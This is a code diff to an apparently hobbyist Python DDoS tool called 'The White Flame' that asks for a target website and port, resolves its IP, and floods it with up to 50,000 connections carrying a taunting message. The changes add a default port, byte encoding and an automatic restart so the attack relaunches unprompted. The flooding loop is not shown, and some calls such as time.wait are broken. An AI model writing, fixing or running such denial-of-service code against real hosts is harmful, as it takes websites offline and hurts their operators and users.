@@ -3,6 +3,7 @@ import time
 import socket
 import os
 import sys
+import string
 # The white flame tools
 baner = """
 The White Flame is here...\033[38;5;208m$\033[0m
@@ -48,11 +49,14 @@ print("\033[1;91minput web url \033[1;95m[ex : www.Example.com ]")
 host = input("\033[1;94mWFE@root : ")
 print("\033[1;91minput port \033[1;95m[ex : 8080 ]")
 port = input("\033[1;94mWFE@root : ")
+if port == "":
+    port = 80
+port = int(port)
 connect = 50000
 ip = socket.gethostbyname(host)
 print("\033[1;91m Attacking \033[1;93m[" + host + "]")
 print("\033[1;91m Attack to ip \033[1;93m[" + ip + "]")
-message = ("WHITE FLAME EANGLE THE FLAMING ENGLE SYSTEM WAS HERE...")
+message = b"WHITE FLAME, THE FLAMING EANGLE SYSTEM WAS HERE..."
 print("\033[1;91mFIRE..............................")
 
 
@@ -75,6 +79,7 @@ for i in range(1, connect):
 print("Ddos has is stopping.........")
 time.wait(2)
 if __name__ == "__main__":
+    restart_program()
     answer = input("Do you want to continue DDoS ??? Type 'fire'...")
     if answer.strip() in "y Y fire Fire FIRE".split():
         restart_program()
